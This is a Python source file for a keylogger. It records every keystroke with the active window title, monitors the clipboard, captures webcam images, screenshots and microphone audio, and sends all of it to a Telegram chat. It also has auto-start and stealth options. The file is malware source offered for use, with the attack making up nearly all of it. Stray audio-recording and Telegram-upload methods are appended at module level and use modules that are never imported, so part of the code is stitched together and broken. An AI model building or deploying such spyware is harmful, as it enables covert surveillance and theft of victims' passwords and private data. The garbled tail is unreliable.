import os
import sys
import threading
import asyncio
import datetime
import logging
import platform
import ctypes
import base64
import hashlib
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import pynput.keyboard

from clipboard import ClipboardHandler
from window_title import WindowTitleHandler
from telegram_handler import TelegramHandler
from audio_recorder import AudioRecorder
from webcam_screenshot import WebcamScreenshot
from encryption_utils import generate_key, encrypt_and_save, rotate_log_file_if_needed

class Keylogger:
    def __init__(self, api_token=None, chat_id=None, enable_clipboard=False, log_file="keylog.enc", encryption_key=None,
                 auto_start=False, stealth_mode=False, enable_webcam=False, enable_screenshot=False,
                 webcam_interval=60, screenshot_interval=60, enable_audio=False, audio_interval=30):
        self.api_token = api_token
        self.chat_id = chat_id
        self.enable_clipboard = enable_clipboard
        self.enable_webcam = enable_webcam
        self.enable_screenshot = enable_screenshot
        self.webcam_interval = webcam_interval
        self.screenshot_interval = screenshot_interval
        self.enable_audio = enable_audio
        self.audio_interval = audio_interval
        self.log_file = log_file
        self.encryption_key = encryption_key or generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.buffer = []
        self.modifiers = set()
        self.log_queue = asyncio.Queue()
        self.loop = None
        self.telegram_task = None
        self.stop_event = threading.Event()
        self.logger = self.setup_logger()
        self.listener = None

        self.clipboard_handler = ClipboardHandler(self.logger)
        self.window_title_handler = WindowTitleHandler(self.logger)
        self.telegram_handler = TelegramHandler(api_token, chat_id, self.logger)
        self.audio_recorder = AudioRecorder(audio_interval, self.logger, api_token, chat_id, self.telegram_handler, None)
        self.webcam_screenshot = WebcamScreenshot(webcam_interval, screenshot_interval, self.logger, api_token, chat_id, self.telegram_handler, None)

        self.new_log_event = asyncio.Event()
        self.auto_start = auto_start
        self.stealth_mode = stealth_mode

        if self.auto_start:
            self.setup_auto_start()

        if self.stealth_mode:
            self.enable_stealth_mode()

    def setup_logger(self):
        logger = logging.getLogger("Keylogger")
        if not logger.hasHandlers():
            logger.setLevel(logging.INFO)
            handler = logging.StreamHandler(sys.stdout)
            formatter = logging.Formatter('%(asctime)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        return logger

    def encrypt_and_save(self, data):
        encrypt_and_save(data, self.cipher, self.log_file, self.logger)

    def rotate_log_file_if_needed(self):
        rotate_log_file_if_needed(self.log_file, self.logger)

    def get_active_window_title(self):
        return self.window_title_handler.get_active_window_title()

    def clipboard_monitor(self):
        self.clipboard_thread = self.clipboard_handler.start(self.log_queue)

    def on_press(self, key):
        try:
            if key in {pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r}:
                self.modifiers.add("Shift")
            elif key in {pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_r}:
                self.modifiers.add("Ctrl")
            elif key in {pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r}:
                self.modifiers.add("Alt")
            else:
                self.process_key(key)
        except Exception as e:
            self.logger.error(f"Error in on_press: {e}")

    def on_release(self, key):
        try:
            if key in {pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r}:
                self.modifiers.discard("Shift")
            elif key in {pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_r}:
                self.modifiers.discard("Ctrl")
            elif key in {pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r}:
                self.modifiers.discard("Alt")
        except Exception as e:
            self.logger.error(f"Error in on_release: {e}")

    def process_key(self, key):
        shift_map = {
            '1': '!',
            '2': '@',
            '3': '#',
            '4': '$',
            '5': '%',
            '6': '^',
            '7': '&',
            '8': '*',
            '9': '(',
            '0': ')',
            '-': '_',
            '=': '+',
            '[': '{',
            ']': '}',
            '\\': '|',
            ';': ':',
            '\'': '"',
            ',': '<',
            '.': '>',
            '/': '?',
            '`': '~'
        }
        char = ""
        try:
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                if "Shift" in self.modifiers:
                    if char in shift_map:
                        char = shift_map[char]
                    else:
                        char = char.upper()
                if "Ctrl" in self.modifiers or "Alt" in self.modifiers:
                    char = f"<{'-'.join(sorted(self.modifiers))}+{char}>"
            else:
                if key == pynput.keyboard.Key.space:
                    char = " "
                elif key == pynput.keyboard.Key.enter:
                    char = "\n"
                elif key == pynput.keyboard.Key.backspace:
                    if self.buffer:
                        self.buffer.pop()
                    return
                else:
                    try:
                        char = f"<{key.name}>"
                    except AttributeError:
                        char = ""
        except Exception as e:
            self.logger.error(f"Error processing key: {e}")
            char = ""

        if char:
            self.buffer.append(char)
            self.log_keystroke(char)

    def log_keystroke(self, char):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = self.get_active_window_title()
        log_entry = f"[{timestamp}] [{window_title}] {char}"
        # Use asyncio.Queue put_nowait to avoid blocking
        try:
            self.log_queue.put_nowait(log_entry)
        except asyncio.QueueFull:
            self.logger.warning("Log queue is full, dropping log entry")
        # Signal new log event for Telegram sender
        if self.loop and self.new_log_event:
            self.loop.call_soon_threadsafe(self.new_log_event.set)

    async def telegram_sender(self):
        while not self.stop_event.is_set():
            await self.new_log_event.wait()
            self.new_log_event.clear()
            messages = []
            max_batch_size = 50
            for _ in range(max_batch_size):
                try:
                    message = self.log_queue.get_nowait()
                    messages.append(message)
                except asyncio.QueueEmpty:
                    break
            if messages:
                message = "\n".join(messages)
                await self.telegram_handler.send_to_telegram(message)
                self.encrypt_and_save(message)

    def start_clipboard_monitor(self):
        if self.enable_clipboard:
            self.clipboard_monitor()

    def start_webcam_monitor(self):
        if self.enable_webcam:
            self.webcam_screenshot.start_webcam_monitor()

    def start_screenshot_monitor(self):
        if self.enable_screenshot:
            self.webcam_screenshot.start_screenshot_monitor()

    def start_audio_monitor(self):
        if self.enable_audio:
            self.audio_recorder.start_audio_monitor()

    def start(self):
        self.logger.info("Starting keylogger...")
        self.start_clipboard_monitor()
        self.start_webcam_monitor()
        self.start_screenshot_monitor()
        self.start_audio_monitor()
        self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.telegram_task = self.loop.create_task(self.telegram_sender())
        # Pass event loop to audio recorder and webcam screenshot for telegram sending
        self.audio_recorder.loop = self.loop
        self.webcam_screenshot.loop = self.loop
        try:
            self.loop.run_forever()
        except KeyboardInterrupt:
            self.stop_event.set()
            self.listener.stop()
            self.loop.stop()
            self.logger.info("Keylogger stopped.")
        finally:
            if self.clipboard_handler and hasattr(self.clipboard_handler, 'stop'):
                self.clipboard_handler.stop()
            if self.clipboard_thread and self.clipboard_thread.is_alive():
                self.clipboard_thread.join()
            if self.webcam_screenshot and hasattr(self.webcam_screenshot, 'stop_monitors'):
                self.webcam_screenshot.stop_monitors()
            if self.audio_recorder and hasattr(self.audio_recorder, 'stop_audio_monitor'):
                self.audio_recorder.stop_audio_monitor()
            if self.listener:
                self.listener.stop()
            self.loop.close()


if __name__ == "__main__":
    load_dotenv()  # This loads variables from .env into environment variables

    API_TOKEN = os.getenv("API_TOKEN")
    CHAT_ID = os.getenv("CHAT_ID")
    ENABLE_CLIPBOARD_MONITOR = True
    ENABLE_WEBCAM = True
    ENABLE_SCREENSHOT = True
    ENABLE_AUDIO_RECORDING = True
    AUDIO_RECORDING_INTERVAL = 30
    WEBCAM_INTERVAL = 600  # seconds
    SCREENSHOT_INTERVAL = 600  # seconds
    AUTO_START = False
    STEALTH_MODE = False

    keylogger = Keylogger(
        api_token=API_TOKEN,
        chat_id=CHAT_ID,
        enable_clipboard=ENABLE_CLIPBOARD_MONITOR,
        enable_webcam=ENABLE_WEBCAM,
        enable_screenshot=ENABLE_SCREENSHOT,
        enable_audio=ENABLE_AUDIO_RECORDING,
        audio_interval=AUDIO_RECORDING_INTERVAL,
        webcam_interval=WEBCAM_INTERVAL,
        screenshot_interval=SCREENSHOT_INTERVAL,
        auto_start=AUTO_START,
        stealth_mode=STEALTH_MODE
    )
    keylogger.start()

    def audio_recording_monitor(self):
        while not self.stop_event.is_set():
            try:
                duration = self.audio_interval
                fs = 44100  # Sample rate
                self.logger.info(f"Starting audio recording for {duration} seconds...")
                recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
                sd.wait()  # Wait until recording is finished
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"audio_recording_{timestamp}.wav"
                # Save recording to WAV file
                with wave.open(filename, 'wb') as wf:
                    wf.setnchannels(2)
                    wf.setsampwidth(2)  # 16 bits = 2 bytes
                    wf.setframerate(fs)
                    wf.writeframes(recording.tobytes())
                self.logger.info(f"Audio recording saved: {filename}")
                # Send audio file via Telegram if enabled
                if self.telegram_available and self.api_token and self.chat_id:
                    self.loop.call_soon_threadsafe(asyncio.ensure_future, self.send_audio_to_telegram(filename))
            except Exception as e:
                self.logger.error(f"Error during audio recording: {e}")

    def start_audio_monitor(self):
        if self.enable_audio:
            self.audio_thread = threading.Thread(target=self.audio_recording_monitor, daemon=True)
            self.audio_thread.start()

    async def send_audio_to_telegram(self, audio_path):
        if not self.api_token or not self.chat_id or not self.telegram_available:
            return
        try:
            from telegram import Bot
            bot = Bot(self.api_token)
            with open(audio_path, "rb") as f:
                await bot.send_audio(chat_id=self.chat_id, audio=f)
        except Exception as e:
            self.logger.error(f"Error sending audio to Telegram: {e}")
